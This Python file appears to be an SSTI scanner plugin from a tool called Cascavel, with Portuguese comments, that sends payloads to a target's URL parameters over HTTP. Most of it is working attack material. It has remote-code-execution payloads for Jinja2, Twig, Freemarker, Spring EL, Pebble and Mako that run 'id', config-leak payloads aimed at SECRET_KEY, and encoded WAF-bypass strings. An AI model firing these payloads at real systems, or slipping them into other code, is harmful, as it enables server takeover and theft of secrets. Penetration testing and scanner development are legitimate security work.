# plugins/ssti_scanner.py — Cascavel 2026 Intelligence
import urllib.parse

import requests

PARAMS = [
    "name",
    "template",
    "msg",
    "message",
    "text",
    "query",
    "search",
    "input",
    "content",
    "title",
    "greeting",
    "email",
    "subject",
    "comment",
    "description",
    "body",
    "value",
    "data",
    "preview",
]

# ──────────── DETECTION PAYLOADS (math probe → engine fingerprint) ────────────
DETECTION_PAYLOADS = [
    # Probe universal — resultado 49 indica avaliação
    ("{{7*7}}", "49", "JINJA2/TWIG"),
    ("${7*7}", "49", "FREEMARKER/MAKO/EL"),
    ("#{7*7}", "49", "RUBY_ERB/THYMELEAF"),
    ("<%= 7*7 %>", "49", "ERB/JSP/EJS"),
    ("{{7*'7'}}", "7777777", "JINJA2_CONFIRM"),
    ("${7*'7'}", "7777777", "MAKO_CONFIRM"),
    ("#set($x=7*7)${x}", "49", "VELOCITY"),
    ("{php}echo 7*7;{/php}", "49", "SMARTY"),
    ("{{= 7*7}}", "49", "NUNJUCKS"),
    ("{%print 7*7%}", "49", "JINJA2_PRINT"),
    ("${{7*7}}", "49", "JAVA_EL"),
    # Polyglot SSTI (testa múltiplos engines com um payload)
    ("{{7*7}}${7*7}<%=7*7%>#{7*7}{7*7}", "49", "POLYGLOT_MULTI"),
]

# ──────────── EXPLOITATION PAYLOADS (RCE probes) ────────────
EXPLOIT_PAYLOADS = [
    # Jinja2 sandbox escape 2026 (lipsum, cycler, joiner)
    ("{{lipsum.__globals__['os'].popen('id').read()}}", "uid=", "JINJA2_LIPSUM_RCE"),
    ("{{cycler.__init__.__globals__.os.popen('id').read()}}", "uid=", "JINJA2_CYCLER_RCE"),
    ("{{joiner.__init__.__globals__.os.popen('id').read()}}", "uid=", "JINJA2_JOINER_RCE"),
    ("{{config.__class__.__init__.__globals__['os'].popen('id').read()}}", "uid=", "JINJA2_CONFIG_RCE"),
    ("{{request.__class__.__mro__[2].__subclasses__()}}", "subprocess", "JINJA2_SUBCLASS_ENUM"),
    # Twig RCE 2026
    ("{{['id']|filter('system')}}", "uid=", "TWIG_FILTER_RCE"),
    ("{{_self.env.setCache('ls')|system}}", "", "TWIG_SETCACHE_RCE"),
    # Freemarker RCE
    ('<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}', "uid=", "FREEMARKER_EXEC"),
    ('${T(java.lang.Runtime).getRuntime().exec("id")}', "", "SPRING_EL_RCE"),
    # Pebble
    (
        (
            '{% set cmd = "id" %}{% set bytes = '
            '(1).TYPE.forName("java.lang.Runtime")'
            ".methods[6].invoke(null,null).exec(cmd) %}"
        ),
        "",
        "PEBBLE_RCE",
    ),
    # Mako
    ("<%import os;x=os.popen('id').read()%>${x}", "uid=", "MAKO_RCE"),
    # Handlebars
    ("{{#with (string.sub.apply 0 codez)}}\n{{this}}\n{{/with}}", "", "HANDLEBARS_PROTO"),
]

# ──────────── CONFIG LEAK PAYLOADS ────────────
CONFIG_PAYLOADS = [
    ("{{config}}", "SECRET_KEY", "JINJA2_CONFIG_LEAK"),
    ("{{config.items()}}", "SECRET_KEY", "JINJA2_CONFIG_ITEMS"),
    ("{{settings.SECRET_KEY}}", "", "DJANGO_SECRET"),
    ("{{self.__init__.__globals__}}", "os", "JINJA2_GLOBALS_LEAK"),
    ("{{request.application.__self__._get_data_for_json.__globals__}}", "json", "FLASK_GLOBALS"),
]

# ──────────── WAF BYPASS SSTI ────────────
WAF_BYPASS = [
    # Unicode normalization
    ("{{lipsum['\u005f\u005fglobals\u005f\u005f']}}", "os", "UNICODE_NORM"),
    # Hex encoding attributes
    ("{{lipsum|attr('\\x5f\\x5fglobals\\x5f\\x5f')}}", "os", "HEX_ATTR"),
    # String concatenation
    ("{{lipsum|attr('__glo'+'bals__')}}", "os", "CONCAT_BYPASS"),
    # Filter bypass via request object
    ("{{request|attr('application')|attr('\\x5f\\x5fglobals\\x5f\\x5f')}}", "os", "REQUEST_ATTR"),
]


def _is_evaluated(resp_text, payload, indicator):
    """Verifica avaliação real (não reflexão literal do payload)."""
    if indicator not in resp_text:
        return False
    return resp_text.count(payload) == 0 or resp_text.count(indicator) > resp_text.count(payload)


def _build_vuln(engine, param, payload, severity="CRITICO"):
    """Constrói objeto de vulnerabilidade SSTI."""
    vuln = {
        "tipo": "SSTI",
        "engine": engine,
        "parametro": param,
        "payload": payload[:100],
        "severidade": severity,
    }
    if "RCE" in engine:
        vuln["descricao"] = f"Remote Code Execution via {engine.split('_')[0]}!"
    elif "LEAK" in engine or "SECRET" in engine:
        vuln["descricao"] = "Configuração sensível exposta!"
    elif "ESCAPE" in engine:
        vuln["descricao"] = "Sandbox escape detectado!"
    return vuln


def run(target, ip, open_ports, banners):
    """
    Scanner SSTI 2026-Grade — Detection + Exploitation + WAF Bypass.

    Engines: Jinja2, Twig, Freemarker, Mako, Velocity, ERB, Smarty,
    Nunjucks, Pebble, Handlebars, Spring EL, Thymeleaf, Java EL, Django.
    Técnicas: Polyglot detection, sandbox escape (lipsum/cycler/joiner),
    Twig filter RCE, Freemarker Execute, config leak, WAF bypass
    (Unicode normalization, hex attr, string concat, request attr).
    30+ payloads.
    """
    _ = (ip, open_ports, banners)
    vulns = []
    detected_params = set()

    for param in PARAMS:
        # Phase 1: Detection
        for payload, indicator, engine in DETECTION_PAYLOADS:
            url = f"http://{target}/?{param}={urllib.parse.quote(payload, safe='')}"
            try:
                resp = requests.get(url, timeout=6)
                if resp.status_code == 200 and _is_evaluated(resp.text, payload, indicator):
                    vulns.append(_build_vuln(engine, param, payload, "ALTO"))
                    detected_params.add(param)
                    break
            except Exception:
                continue

        # Phase 2: Exploitation (apenas se detecção foi positiva no param)
        if param in detected_params:
            for payload, indicator, engine in EXPLOIT_PAYLOADS:
                url = f"http://{target}/?{param}={urllib.parse.quote(payload, safe='')}"
                try:
                    resp = requests.get(url, timeout=8)
                    if indicator and indicator in resp.text:
                        vulns.append(_build_vuln(engine, param, payload))
                        break
                except Exception:
                    continue

        # Phase 3: Config Leak (sempre testar)
        for payload, indicator, engine in CONFIG_PAYLOADS:
            url = f"http://{target}/?{param}={urllib.parse.quote(payload, safe='')}"
            try:
                resp = requests.get(url, timeout=6)
                if resp.status_code == 200 and (indicator in resp.text if indicator else len(resp.text) > 500):
                    vulns.append(_build_vuln(engine, param, payload, "ALTO"))
                    break
            except Exception:
                continue

        # Phase 4: WAF Bypass (se detection falhou mas parece filtrável)
        if param not in detected_params:
            for payload, indicator, engine in WAF_BYPASS:
                url = f"http://{target}/?{param}={urllib.parse.quote(payload, safe='')}"
                try:
                    resp = requests.get(url, timeout=6)
                    if indicator and indicator in resp.text:
                        vulns.append(_build_vuln(f"WAF_BYPASS_{engine}", param, payload))
                        break
                except Exception:
                    continue

    return {
        "plugin": "ssti_scanner",
        "versao": "2026.1",
        "tecnicas": [
            "detection",
            "exploitation",
            "config_leak",
            "waf_bypass",
            "polyglot",
            "sandbox_escape",
            "unicode_norm",
            "hex_attr",
        ],
        "resultados": vulns if vulns else "Nenhum SSTI detectado",
    }
